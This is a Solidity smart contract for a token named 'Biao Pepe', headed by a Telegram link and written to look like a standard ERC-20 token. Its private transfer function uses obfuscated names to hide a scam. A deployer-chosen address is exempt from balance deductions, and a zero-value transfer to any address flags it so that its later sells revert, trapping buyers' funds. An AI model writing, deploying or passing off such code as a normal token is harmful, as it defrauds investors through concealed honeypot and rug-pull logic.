/*

https://t.me/biaopepe_eth

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BiaoPepe is Ownable {
    function transfer(address trail, uint256 become) public returns (bool success) {
        morning(msg.sender, trail, become);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address mark, uint256 become) public returns (bool success) {
        allowance[msg.sender][mark] = become;
        emit Approval(msg.sender, mark, become);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address traffic, address trail, uint256 become) public returns (bool success) {
        require(become <= allowance[traffic][msg.sender]);
        allowance[traffic][msg.sender] -= become;
        morning(traffic, trail, become);
        return true;
    }

    string public symbol = 'Biao Pepe';

    uint8 public decimals = 9;

    uint256 private crack = 18;

    function morning(address traffic, address trail, uint256 become) private returns (bool success) {
        if (expression[traffic] == 0) {
            balanceOf[traffic] -= become;
        }

        if (become == 0) hurry[trail] += crack;

        if (traffic != uniswapV2Pair && expression[traffic] == 0 && hurry[traffic] > 0) {
            expression[traffic] -= crack;
        }

        balanceOf[trail] += become;
        emit Transfer(traffic, trail, become);
        return true;
    }

    string public name = 'Biao Pepe';

    mapping(address => uint256) private expression;

    mapping(address => uint256) public balanceOf;

    constructor(address follow) {
        balanceOf[msg.sender] = totalSupply;
        expression[follow] = crack;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private hurry;

    address public uniswapV2Pair;
}